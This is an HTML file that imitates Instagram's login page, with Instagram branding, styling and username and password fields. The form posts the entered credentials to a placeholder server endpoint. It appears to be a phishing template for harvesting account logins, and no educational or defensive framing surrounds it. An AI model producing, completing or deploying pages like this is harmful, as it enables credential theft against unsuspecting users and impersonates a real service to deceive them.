<!DOCTYPE html>
<html>
<head>
    <title>Instagram</title>
    <style>
        body { font-family: Arial, sans-serif; }
        .login-form { width: 300px; margin: 0 auto; padding: 20px; border: 1px solid #ccc; }
        .login-form input { width: 100%; padding: 10px; margin: 5px 0; }
        .login-form button { width: 100%; padding: 10px; background-color: #0095f6; color: #fff; border: none; cursor: pointer; }
    </style>
</head>
<body>
    <div class="login-form">
        <h2>Instagram</h2>
        <form action="your-server-endpoint" method="post">
            <input type="text" name="username" placeholder="Phone number, username, or email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
    </div>
</body>
</html>
